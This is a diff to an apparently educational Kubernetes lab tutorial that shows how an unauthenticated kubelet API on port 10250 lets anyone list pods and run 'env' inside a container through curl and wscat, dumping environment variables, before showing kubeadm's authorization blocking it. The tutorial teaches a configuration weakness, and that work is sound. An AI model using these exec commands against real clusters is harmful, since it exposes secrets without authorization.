@@ -17,7 +17,7 @@ minikube start
 ```
 # port 10250 is the read/write port that the Kubelet API uses for communication to the master node
 minikube ip
-curl --insecure https://<minikubeIP>:10250/pods | jq
+curl --insecure https://$(minikube ip):10250/pods | jq
 # jq is a tool to prettify JSON output - it is optional 
 ```
 
@@ -29,19 +29,19 @@ kubectl get pods
 
 4. Now we have our unshorten-api Deployment and Service up and running we can extract details from them using the same `curl` command we used before:
 ```
-curl --insecure https://<minikubeIP>:10250/pods | jq
+curl --insecure https://$(minikube ip):10250/pods | jq
 ```
 
 5. In the `metadata` field of the JSON output for our Pod you will find the pod name (remember, this curl command is NOT authenticated. An attacker can see this info without the proper settings in place!). The value will look something like `"name": "link-unshorten-8746d649b-7k8w2",`
 
 6. Now, we take that Pod name and run another curl command. Reading Pod data is interesting but we want to do some damage:
 ```
-curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://192.168.99.100:10250/exec/default/link-unshorten-8746d649b-7k8w2/unshorten-api-container?command=env&input=1&output=1&tty=1"
+curl --insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -X POST "https://$(minikube ip):10250/exec/default/link-unshorten-8746d649b-7k8w2/unshorten-api-container?command=env&input=1&output=1&tty=1"
 ```
 
 7. This opens a stream which we can access using [wscat](https://www.npmjs.com/package/wscat). Take note of the `location:` header as we will be using that value to read from the stream. You can install `wscat` using the link above. Once `wscat` is installed, run the following command:
 ```
-wscat -c "https://<minikubeIP>:10250/cri/exec/<valueFrom302>" --no-check
+wscat -c "https://$(minikube ip):10250/cri/exec/<valueFrom302>" --no-check
 ```
     
 You can use cURL too:
@@ -53,7 +53,7 @@ curl -k --include \
      --header "Upgrade: websocket" \
      --header "Sec-WebSocket-Key: SGVsbG8sIHdvcmxkIQ==" \
      --header "Sec-WebSocket-Version: 13" \
-     https://<minikubeIP>:10250/cri/exec/<valueFrom302>
+     https://$(minikube ip):10250/cri/exec/<valueFrom302>
 ```
 
 8. These are *all of the environment variables* for our unshorten-api pod, printed to the screen, unauthenticated. 
@@ -69,7 +69,7 @@ minikube start --bootstrapper kubeadm
 
 1. Run our `curl` command from before. We see that the response is `Forbidden` which is due to how `kubeadm` bootstraps clusters. `kubeadm` implements authorization of the kubelet by default. Let's take a look at this setting under the hood:
 ```
-curl --insecure https://192.168.99.100:10250/pods
+curl --insecure https://$(minikube ip):10250/pods
 ```
 
 2. SSH into our Minikube node and take a look at our kubelet config:
